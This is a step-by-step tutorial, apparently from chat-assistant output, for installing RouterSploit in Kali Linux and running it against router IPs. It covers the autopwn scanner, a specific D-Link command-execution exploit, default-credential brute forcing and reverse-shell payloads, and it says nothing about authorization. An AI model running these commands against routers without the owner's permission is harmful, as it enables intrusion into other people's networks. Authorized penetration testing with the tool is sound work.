🔧 Step-by-Step: How to Use RouterSploit in Kali Linux
✅ 1. Install RouterSploit
RouterSploit is not pre-installed in Kali by default. To install:

bash
Copy
Edit
sudo apt update
sudo apt install git python3-pip
git clone https://github.com/threat9/routersploit
cd routersploit
pip3 install -r requirements.txt
▶️ 2. Run RouterSploit
bash
Copy
Edit
sudo python3 rsf.py
This opens the RouterSploit interactive shell:

nginx
Copy
Edit
rsf >
🛠️ 3. Use the Scanner Module
To scan for routers and their vulnerabilities:

bash
Copy
Edit
rsf > use scanners/autopwn
rsf (Autopwn) > set target [IP_ADDRESS]
rsf (Autopwn) > run
Example:

bash
Copy
Edit
set target 192.168.1.1
This will automatically run all known router exploits against the IP.

🔍 4. Manual Exploit Selection
You can browse specific exploit modules:

bash
Copy
Edit
rsf > show modules
Then choose a module:

bash
Copy
Edit
use exploits/routers/dlink/dlink_dir_300_320_dir_600_exec
set target 192.168.1.1
run
📜 5. Set Target IP and Run Exploit
Inside the module:

bash
Copy
Edit
set target 192.168.1.1
run
If the exploit is successful, you'll get a reverse shell or credentials.

🧠 6. Other Useful Modules
scanners/autopwn — Auto scans and exploits

creds/routers — Router default creds brute force

payloads — Reverse shells or bind shells

exploits/routers/ — Specific router brand vulnerabilities

🧪 Example Full Command Flow
bash
Copy
Edit
cd routersploit
sudo python3 rsf.py
use scanners/autopwn
set target 192.168.0.1
run
📌 Tip: Update RouterSploit Regularly
bash
Copy
Edit
cd routersploit
git pull
